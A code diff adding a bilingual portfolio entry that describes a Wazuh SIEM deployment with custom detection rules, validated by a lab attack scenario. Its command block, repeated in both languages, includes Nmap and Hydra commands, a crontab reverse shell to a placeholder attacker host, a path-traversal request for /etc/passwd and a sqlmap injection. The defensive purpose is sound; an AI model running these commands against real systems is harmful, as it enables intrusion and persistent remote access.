@@ -1093,7 +1093,341 @@ tags:
     )
   },
   github:"https://github.com/anxxooo/Fat32-file-system.git"
-}
+},
 
+{
+  title: {
+    en: "SIEM Monitoring & Threat Detection for Hybrid Linux/Windows Infrastructure",
+    fr: "Surveillance et détection SIEM pour infrastructure Linux/Windows",
+  },
+  category: {
+    en: "Cybersecurity / SOC",
+    fr: "Cybersécurité / SOC",
+  },
+  shortDescription: {
+    en: "Deploying Wazuh as a central SIEM over a hybrid Linux/Windows infrastructure, with CIS hardening, custom multi-stage detection rules, raw-log investigation via Filebeat, and validation through a full attack scenario.",
+    fr: "Déploiement de Wazuh comme SIEM central sur une infrastructure Linux/Windows, avec durcissement CIS, règles de détection personnalisées multi-étapes, investigation des logs bruts via Filebeat, et validation par un scénario d'attaque complet.",
+  },
+  longDescription: {
+    en: `The goal was to build a continuous monitoring and detection solution for a heterogeneous Linux/Windows infrastructure based on the open-source SIEM Wazuh.
+Hardened the central server using CIS Benchmarks (Lynis), connected Wazuh agents on Ubuntu and Windows machines, wrote a set of custom detection rules leveraging frequency and event correlation to catch multi-stage attacks, and built a dedicated investigation layer using multiple Filebeat instances feeding parsed logs into OpenSearch dashboards (SSH, UFW, sudo, Apache, MySQL). The whole solution was validated through an eight-step attack scenario reproduced from a Kali Linux attacker, from network reconnaissance to SQL injection.`,
+    fr: `L'objectif était de construire une solution de surveillance et de détection continue pour une infrastructure hétérogène Linux/Windows, basée sur le SIEM open source Wazuh.
+Durci le serveur central via les CIS Benchmarks (Lynis), connecté des agents Wazuh sur des machines Ubuntu et Windows, développé un ensemble de règles de détection personnalisées exploitant la fréquence et la corrélation d'événements pour détecter des attaques multi-étapes, et mis en place une couche d'investigation dédiée via plusieurs instances Filebeat alimentant des tableaux de bord OpenSearch (SSH, UFW, sudo, Apache, MySQL). L'ensemble a été validé par un scénario d'attaque en huit étapes reproduit depuis une machine attaquante Kali Linux, de la reconnaissance réseau à l'injection SQL.`,
+  },
+  techs: [
+    "Wazuh",
+    "SIEM",
+    "Linux",
+    "Windows",
+    "Filebeat",
+    "OpenSearch",
+    "CIS Benchmarks",
+    "Lynis",
+    "auditd",
+    "FIM",
+    "MITRE ATT&CK",
+    "VMware",
+    "SOC",
+  ],
+  slug: "wazuh-siem-monitoring",
+  content: {
+    en: (
+      <>
+        <section className="mb-8">
+          <h2 className="text-2xl font-semibold mb-3 text-green-400">Project Context</h2>
+          <p className="mb-3">
+            This project addresses a concrete operational problem:
+            a large infrastructure generates thousands of system events per machine, far beyond what a security team can monitor manually.
+            The objective was to centralize detection and investigation across a heterogeneous Linux/Windows environment using Wazuh as the SIEM core.
+          </p>
+          <div className="border-l-4 border-green-400 p-4 rounded shadow-[inset_0_1px_0_rgba(255,255,255,0.05),0_10px_25px_rgba(0,0,0,0.8)] bg-[#111218]">
+            <p className="text-sm font-semibold">Environment</p>
+            <p className="text-sm text-gray-300">
+              Four virtual machines under VMware Workstation: a hardened Wazuh server (Manager + Indexer + Dashboard),
+              an Ubuntu agent, a Windows agent, and a Kali Linux attacker used to safely simulate attacks in an isolated lab.
+            </p>
+          </div>
+        </section>
+ 
+        <section className="mb-8">
+          <h2 className="text-2xl font-semibold mb-3 text-green-400">Central Server Hardening — CIS Benchmarks</h2>
+          <p className="mb-3">
+            Before deploying any component, the Wazuh server was hardened following CIS Benchmarks recommendations, audited with Lynis.
+            Corrective measures included disabling unnecessary services, strengthening access policies, enabling a malware scanner and applying strict permissions on system files.
+          </p>
+          <p className="mb-3">
+            The hardening index rose from <strong>61/100</strong> to <strong>91/100</strong>, the malware scanner became active, and the number of covered tests increased from 244 to 260.
+          </p>
+        </section>
+ 
+        <section className="mb-8">
+          <h2 className="text-2xl font-semibold mb-3 text-green-400">Wazuh Deployment</h2>
+          <p className="mb-3">
+            The Wazuh server (Ubuntu 22.04 LTS) bundles the three central components: the <strong>Manager</strong> (event decoding, normalization and rule engine),
+            the <strong>Indexer</strong> (OpenSearch-based storage and indexing) and the <strong>OpenSearch Dashboard</strong> (visualization).
+          </p>
+          <p className="mb-3">Two agents were connected and confirmed as <em>Active</em>:</p>
+          <ul className="list-disc list-inside mb-4 ml-4 space-y-1">
+            <li><strong>ubuntu-agent</strong> — Ubuntu 22.04 with a Wazuh agent and an Apache server for web-attack simulation.</li>
+            <li><strong>windows-agent</strong> — Windows 10 with a Wazuh agent, XAMPP and DVWA for web-attack simulation.</li>
+          </ul>
+        </section>
+ 
+        <section className="mb-8">
+          <h2 className="text-2xl font-semibold mb-3 text-green-400">Investigation Layer — Filebeat & OpenSearch</h2>
+          <p className="mb-3">
+            Normalized Wazuh events keep only the fields needed for alerting, so they don't provide a complete history of system activity.
+            To enable deep investigation, we deployed multiple Filebeat instances, each dedicated to a specific log type.
+          </p>
+          <p className="mb-3">On <strong>ubuntu-agent</strong>, four Filebeat instances were configured:</p>
+          <ul className="list-disc list-inside mb-4 ml-4 space-y-1">
+            <li><strong>SSH</strong> — authentication logs (<code>/var/log/auth.log</code>): successful and failed logins, source IP, username.</li>
+            <li><strong>UFW</strong> — firewall logs: every blocked or allowed connection.</li>
+            <li><strong>Apache Access</strong> — HTTP requests: source IP, requested page, response code.</li>
+            <li><strong>Sudo</strong> — commands executed with elevated privileges.</li>
+          </ul>
+          <p className="mb-3">
+            On ubuntu-agent, raw logs are sent to the Manager where a dedicated ingestion pipeline (parser) extracts and structures the useful fields before indexing into a dedicated index (e.g. <code>ssh-logs</code>).
+            On <strong>windows-agent</strong>, a single Filebeat instance with an embedded parser handles Apache access, Apache error and MySQL logs locally before sending them directly to the Indexer.
+          </p>
+          <p className="mb-3">
+            Each log type gets its own OpenSearch dashboard, letting an analyst filter by any parsed field (IP, user, port, HTTP code...) or by time range to precisely reconstruct an incident timeline.
+          </p>
+        </section>
+ 
+        <section className="mb-8">
+          <h2 className="text-2xl font-semibold mb-3 text-green-400">Custom Detection Rules</h2>
+          <p className="mb-3">
+            Wazuh's default rules can't correlate events or detect suspicious sequences spread over time.
+            We developed our own ruleset integrated into the Manager, leveraging two advanced mechanisms — <strong>frequency</strong> and <strong>correlation</strong> — to catch multi-stage attacks.
+            For sensitive system events (critical file modifications, privileged commands), the Linux <strong>auditd</strong> module was configured to capture the relevant system calls and feed them to the detection logic.
+          </p>
+
+          <h3 className="text-xl font-semibold mb-2 mt-6">Representative rules</h3>
+          <div className="overflow-x-auto">
+            <table className="w-full text-sm border border-gray-700">
+              <thead className="bg-[#111218]">
+                <tr>
+                  <th className="text-left p-2 border border-gray-700">Rule ID</th>
+                  <th className="text-left p-2 border border-gray-700">Description</th>
+                  <th className="text-left p-2 border border-gray-700">Level</th>
+                  <th className="text-left p-2 border border-gray-700">Category</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr><td className="p-2 border border-gray-700">100002</td><td className="p-2 border border-gray-700">SSH brute force — 8+ attempts in 2 min</td><td className="p-2 border border-gray-700">10</td><td className="p-2 border border-gray-700">Brute force</td></tr>
+                <tr><td className="p-2 border border-gray-700">100004</td><td className="p-2 border border-gray-700">Account compromise — success after brute force</td><td className="p-2 border border-gray-700">14</td><td className="p-2 border border-gray-700">Compromise</td></tr>
+                <tr><td className="p-2 border border-gray-700">100102</td><td className="p-2 border border-gray-700">Root crontab modified — critical persistence</td><td className="p-2 border border-gray-700">12</td><td className="p-2 border border-gray-700">Persistence</td></tr>
+                <tr><td className="p-2 border border-gray-700">100107</td><td className="p-2 border border-gray-700">New user account created</td><td className="p-2 border border-gray-700">12</td><td className="p-2 border border-gray-700">Account manipulation</td></tr>
+                <tr><td className="p-2 border border-gray-700">100401</td><td className="p-2 border border-gray-700">Sensitive file permissions changed</td><td className="p-2 border border-gray-700">11</td><td className="p-2 border border-gray-700">Sensitive files</td></tr>
+                <tr><td className="p-2 border border-gray-700">100403</td><td className="p-2 border border-gray-700">Several critical files modified within 2 min</td><td className="p-2 border border-gray-700">15</td><td className="p-2 border border-gray-700">Correlation</td></tr>
+                <tr><td className="p-2 border border-gray-700">100501</td><td className="p-2 border border-gray-700">Port scan detected — multiple blocked connections</td><td className="p-2 border border-gray-700">10</td><td className="p-2 border border-gray-700">Reconnaissance</td></tr>
+                <tr><td className="p-2 border border-gray-700">100600</td><td className="p-2 border border-gray-700">RCE attempt — system command / sensitive file in URL</td><td className="p-2 border border-gray-700">12</td><td className="p-2 border border-gray-700">Web / RCE</td></tr>
+                <tr><td className="p-2 border border-gray-700">100611</td><td className="p-2 border border-gray-700">SQL injection possibly successful — HTTP 200</td><td className="p-2 border border-gray-700">14</td><td className="p-2 border border-gray-700">SQL injection</td></tr>
+              </tbody>
+            </table>
+          </div>
+          <p className="text-sm text-gray-400 mt-2">Subset of the full ruleset (30+ rules across authentication, privilege escalation, persistence, file integrity, reconnaissance and web attacks).</p>
+        </section>
+ 
+        <section className="mb-8">
+          <h2 className="text-2xl font-semibold mb-3 text-green-400">Validation — Attack Scenario</h2>
+          <p className="mb-3">
+            The solution was validated by reproducing a progressive attack from Kali Linux, mimicking an attacker compromising a corporate infrastructure. Each step generated the expected alert at the correct severity level.
+          </p>
+          <p className="font-semibold mb-2">Phase 1 — ubuntu-agent:</p>
+          <ul className="list-disc list-inside mb-4 ml-4 space-y-1">
+            <li>Reconnaissance: port scan with Nmap (<code>-sS -sV</code>) → UFW blocks correlated, rule 100501.</li>
+            <li>Intrusion: SSH brute force with Hydra → 8+ failures in 2 min, rule 100002.</li>
+            <li>Account compromise: successful SSH login correlated with prior failures, rule 100004.</li>
+            <li>Privilege escalation: <code>useradd</code> / <code>usermod -aG sudo</code> → rules 100400, 100402, 100107.</li>
+            <li>Persistence: reverse shell via crontab → rule 100101.</li>
+            <li>System tampering: <code>chmod 777 /etc/shadow</code> → FIM, rule 100401.</li>
+            <li>Web attack: path traversal &amp; RCE attempt on Apache → rule 100600.</li>
+          </ul>
+          <p className="font-semibold mb-2">Phase 2 — windows-agent:</p>
+          <ul className="list-disc list-inside mb-4 ml-4 space-y-1">
+            <li>SQL injection on DVWA with sqlmap → rules 100612 then 100611 (HTTP 200).</li>
+          </ul>
+          <div className="bg-gray-900 text-green-400 p-4 rounded font-mono text-sm overflow-x-auto mb-4">
+            <pre>{`# Reconnaissance
+nmap -sS -sV <target>
+ 
+# SSH brute force
+hydra -L users.txt -P pwds.txt <target> ssh -t 5
+ 
+# Persistence (reverse shell via crontab)
+(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -i >& /dev/tcp/<attacker>/4444 0>&1") | crontab -
+ 
+# Web RCE attempt
+curl "http://<target>/index.php?file=../../../etc/passwd"
+ 
+# SQL injection
+sqlmap -u "http://<target>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --batch --level=3`}</pre>
+          </div>
+        </section>
+ 
+        <section className="mb-8">
+          <h2 className="text-2xl font-semibold mb-3 text-green-400">Outcomes</h2>
+          <p className="mb-3">
+            All eight attack steps — from network reconnaissance to SQL injection — were detected with the correct alert and severity level.
+            The two-layer architecture (detection via custom rules, investigation via Filebeat-fed OpenSearch dashboards) proved coherent and complementary.
+          </p>
+          <p>
+            The project gave hands-on experience deploying and tuning a SIEM, hardening systems against CIS Benchmarks, writing correlation-based detection rules mapped to MITRE ATT&amp;CK, and running a structured Blue Team validation workflow.
+          </p>
+        </section>
+      </>
+    ),
+    fr: (
+      <>
+        <section className="mb-8">
+          <h2 className="text-2xl font-semibold mb-3 text-green-400">Contexte du Projet</h2>
+          <p className="mb-3">
+            Réalisé au sein du département sécurité informatique d'Ooredoo Algérie, ce projet répond à une problématique opérationnelle concrète :
+            une grande infrastructure génère des milliers d'événements système par machine, bien au-delà de ce qu'une équipe de sécurité peut surveiller manuellement.
+            L'objectif était de centraliser la détection et l'investigation sur un environnement hétérogène Linux/Windows en utilisant Wazuh comme cœur SIEM.
+          </p>
+          <div className="border-l-4 border-green-400 p-4 rounded shadow-[inset_0_1px_0_rgba(255,255,255,0.05),0_10px_25px_rgba(0,0,0,0.8)] bg-[#111218]">
+            <p className="text-sm font-semibold">Environnement</p>
+            <p className="text-sm text-gray-300">
+              Quatre machines virtuelles sous VMware Workstation : un serveur Wazuh durci (Manager + Indexer + Dashboard),
+              un agent Ubuntu, un agent Windows, et une machine attaquante Kali Linux pour simuler les attaques dans un lab isolé.
+            </p>
+          </div>
+        </section>
+ 
+        <section className="mb-8">
+          <h2 className="text-2xl font-semibold mb-3 text-green-400">Durcissement du Serveur Central — CIS Benchmarks</h2>
+          <p className="mb-3">
+            Avant tout déploiement, le serveur Wazuh a été durci en suivant les recommandations CIS Benchmarks, audité avec Lynis.
+            Les mesures correctives ont inclus la désactivation des services inutiles, le renforcement des politiques d'accès, l'activation d'un scanner de malware et l'application de permissions strictes sur les fichiers système.
+          </p>
+          <p className="mb-3">
+            Le hardening index est passé de <strong>61/100</strong> à <strong>91/100</strong>, le scanner de malware est devenu actif, et le nombre de tests couverts est passé de 244 à 260.
+          </p>
+        </section>
+ 
+        <section className="mb-8">
+          <h2 className="text-2xl font-semibold mb-3 text-green-400">Déploiement de Wazuh</h2>
+          <p className="mb-3">
+            Le serveur Wazuh (Ubuntu 22.04 LTS) regroupe les trois composants centraux : le <strong>Manager</strong> (décodage, normalisation des événements et moteur de règles),
+            l'<strong>Indexer</strong> (stockage et indexation basés sur OpenSearch) et le <strong>tableau de bord OpenSearch</strong> (visualisation).
+          </p>
+          <p className="mb-3">Deux agents ont été connectés et confirmés <em>Active</em> :</p>
+          <ul className="list-disc list-inside mb-4 ml-4 space-y-1">
+            <li><strong>ubuntu-agent</strong> — Ubuntu 22.04 avec un agent Wazuh et un serveur Apache pour la simulation d'attaques web.</li>
+            <li><strong>windows-agent</strong> — Windows 10 avec un agent Wazuh, XAMPP et DVWA pour la simulation d'attaques web.</li>
+          </ul>
+        </section>
+ 
+        <section className="mb-8">
+          <h2 className="text-2xl font-semibold mb-3 text-green-400">Couche d'Investigation — Filebeat & OpenSearch</h2>
+          <p className="mb-3">
+            Les événements normalisés par Wazuh ne conservent que les champs nécessaires à la génération d'alertes — ils ne fournissent donc pas un historique complet de l'activité système.
+            Pour permettre une investigation approfondie, nous avons déployé plusieurs instances Filebeat, chacune dédiée à un type de logs spécifique.
+          </p>
+          <p className="mb-3">Sur <strong>ubuntu-agent</strong>, quatre instances Filebeat ont été configurées :</p>
+          <ul className="list-disc list-inside mb-4 ml-4 space-y-1">
+            <li><strong>SSH</strong> — logs d'authentification (<code>/var/log/auth.log</code>) : connexions réussies et échouées, IP source, nom d'utilisateur.</li>
+            <li><strong>UFW</strong> — logs du pare-feu : toutes les connexions bloquées ou autorisées.</li>
+            <li><strong>Apache Access</strong> — requêtes HTTP : IP source, page demandée, code de réponse.</li>
+            <li><strong>Sudo</strong> — commandes exécutées avec des privilèges élevés.</li>
+          </ul>
+          <p className="mb-3">
+            Sur ubuntu-agent, les logs bruts sont envoyés au Manager où un pipeline d'ingestion dédié (parser) extrait et structure les champs utiles avant indexation dans un index dédié (ex. <code>ssh-logs</code>).
+            Sur <strong>windows-agent</strong>, une seule instance Filebeat avec parser intégré traite localement les logs Apache access, Apache error et MySQL avant envoi direct à l'Indexer.
+          </p>
+          <p className="mb-3">
+            Chaque type de logs dispose de son propre tableau de bord OpenSearch, permettant à l'analyste de filtrer par n'importe quel champ parsé (IP, user, port, code HTTP...) ou par plage temporelle pour reconstituer précisément la chronologie d'un incident.
+          </p>
+        </section>
+ 
+        <section className="mb-8">
+          <h2 className="text-2xl font-semibold mb-3 text-green-400">Règles de Détection Personnalisées</h2>
+          <p className="mb-3">
+            Les règles par défaut de Wazuh ne permettent pas de corréler des événements ni de détecter des séquences suspectes étalées dans le temps.
+            Nous avons développé notre propre ensemble de règles intégrées au Manager, exploitant deux mécanismes avancés — la <strong>fréquence</strong> et la <strong>corrélation</strong> — pour détecter des attaques multi-étapes.
+            Pour les événements système sensibles (modifications de fichiers critiques, commandes privilégiées), le module Linux <strong>auditd</strong> a été configuré pour capturer les appels système concernés et les soumettre à la logique de détection.
+          </p>
+
+          <h3 className="text-xl font-semibold mb-2 mt-6">Règles représentatives</h3>
+          <div className="overflow-x-auto">
+            <table className="w-full text-sm border border-gray-700">
+              <thead className="bg-[#111218]">
+                <tr>
+                  <th className="text-left p-2 border border-gray-700">Rule ID</th>
+                  <th className="text-left p-2 border border-gray-700">Description</th>
+                  <th className="text-left p-2 border border-gray-700">Niveau</th>
+                  <th className="text-left p-2 border border-gray-700">Catégorie</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr><td className="p-2 border border-gray-700">100002</td><td className="p-2 border border-gray-700">Force brute SSH — 8+ tentatives en 2 min</td><td className="p-2 border border-gray-700">10</td><td className="p-2 border border-gray-700">Force brute</td></tr>
+                <tr><td className="p-2 border border-gray-700">100004</td><td className="p-2 border border-gray-700">Compromission de compte — succès après force brute</td><td className="p-2 border border-gray-700">14</td><td className="p-2 border border-gray-700">Compromission</td></tr>
+                <tr><td className="p-2 border border-gray-700">100102</td><td className="p-2 border border-gray-700">Crontab root modifié — persistance critique</td><td className="p-2 border border-gray-700">12</td><td className="p-2 border border-gray-700">Persistance</td></tr>
+                <tr><td className="p-2 border border-gray-700">100107</td><td className="p-2 border border-gray-700">Création d'un nouveau compte utilisateur</td><td className="p-2 border border-gray-700">12</td><td className="p-2 border border-gray-700">Manipulation de compte</td></tr>
+                <tr><td className="p-2 border border-gray-700">100401</td><td className="p-2 border border-gray-700">Permissions d'un fichier sensible modifiées</td><td className="p-2 border border-gray-700">11</td><td className="p-2 border border-gray-700">Fichiers sensibles</td></tr>
+                <tr><td className="p-2 border border-gray-700">100403</td><td className="p-2 border border-gray-700">Plusieurs fichiers critiques modifiés en moins de 2 min</td><td className="p-2 border border-gray-700">15</td><td className="p-2 border border-gray-700">Corrélation</td></tr>
+                <tr><td className="p-2 border border-gray-700">100501</td><td className="p-2 border border-gray-700">Scan de ports détecté — plusieurs connexions bloquées</td><td className="p-2 border border-gray-700">10</td><td className="p-2 border border-gray-700">Reconnaissance</td></tr>
+                <tr><td className="p-2 border border-gray-700">100600</td><td className="p-2 border border-gray-700">Tentative RCE — commande système / fichier sensible dans l'URL</td><td className="p-2 border border-gray-700">12</td><td className="p-2 border border-gray-700">Web / RCE</td></tr>
+                <tr><td className="p-2 border border-gray-700">100611</td><td className="p-2 border border-gray-700">Injection SQL possiblement réussie — HTTP 200</td><td className="p-2 border border-gray-700">14</td><td className="p-2 border border-gray-700">Injection SQL</td></tr>
+              </tbody>
+            </table>
+          </div>
+          <p className="text-sm text-gray-400 mt-2">Sous-ensemble de l'ensemble complet (30+ règles couvrant authentification, escalade de privilèges, persistance, intégrité des fichiers, reconnaissance et attaques web).</p>
+        </section>
+ 
+        <section className="mb-8">
+          <h2 className="text-2xl font-semibold mb-3 text-green-400">Validation — Scénario d'Attaque</h2>
+          <p className="mb-3">
+            La solution a été validée en reproduisant une attaque progressive depuis Kali Linux, imitant un attaquant cherchant à compromettre une infrastructure d'entreprise. Chaque étape a généré l'alerte attendue avec le bon niveau de criticité.
+          </p>
+          <p className="font-semibold mb-2">Phase 1 — ubuntu-agent :</p>
+          <ul className="list-disc list-inside mb-4 ml-4 space-y-1">
+            <li>Reconnaissance : scan de ports avec Nmap (<code>-sS -sV</code>) → blocages UFW corrélés, règle 100501.</li>
+            <li>Intrusion : force brute SSH avec Hydra → 8+ échecs en 2 min, règle 100002.</li>
+            <li>Compromission de compte : connexion SSH réussie corrélée aux échecs précédents, règle 100004.</li>
+            <li>Escalade de privilèges : <code>useradd</code> / <code>usermod -aG sudo</code> → règles 100400, 100402, 100107.</li>
+            <li>Persistance : reverse shell via crontab → règle 100101.</li>
+            <li>Modification système : <code>chmod 777 /etc/shadow</code> → FIM, règle 100401.</li>
+            <li>Attaque web : path traversal &amp; tentative RCE sur Apache → règle 100600.</li>
+          </ul>
+          <p className="font-semibold mb-2">Phase 2 — windows-agent :</p>
+          <ul className="list-disc list-inside mb-4 ml-4 space-y-1">
+            <li>Injection SQL sur DVWA avec sqlmap → règles 100612 puis 100611 (HTTP 200).</li>
+          </ul>
+          <div className="bg-gray-900 text-green-400 p-4 rounded font-mono text-sm overflow-x-auto mb-4">
+            <pre>{`# Reconnaissance
+nmap -sS -sV <cible>
+ 
+# Force brute SSH
+hydra -L users.txt -P pwds.txt <cible> ssh -t 5
+ 
+# Persistance (reverse shell via crontab)
+(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -i >& /dev/tcp/<attaquant>/4444 0>&1") | crontab -
+ 
+# Tentative RCE web
+curl "http://<cible>/index.php?file=../../../etc/passwd"
+ 
+# Injection SQL
+sqlmap -u "http://<cible>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --batch --level=3`}</pre>
+          </div>
+        </section>
+ 
+        <section className="mb-8">
+          <h2 className="text-2xl font-semibold mb-3 text-green-400">Résultats</h2>
+          <p className="mb-3">
+            Les huit étapes de l'attaque — de la reconnaissance réseau à l'injection SQL — ont toutes été détectées avec l'alerte et le niveau de criticité appropriés.
+            L'architecture en deux couches (détection via règles personnalisées, investigation via tableaux de bord OpenSearch alimentés par Filebeat) s'est révélée cohérente et complémentaire.
+          </p>
+          <p>
+            Le projet a apporté une expérience pratique du déploiement et du paramétrage d'un SIEM, du durcissement des systèmes selon les CIS Benchmarks, de l'écriture de règles de détection par corrélation mappées à MITRE ATT&amp;CK, et de la conduite d'un workflow de validation Blue Team structuré.
+          </p>
+        </section>
+      </>
+    ),
+  },
+}
 
 ];
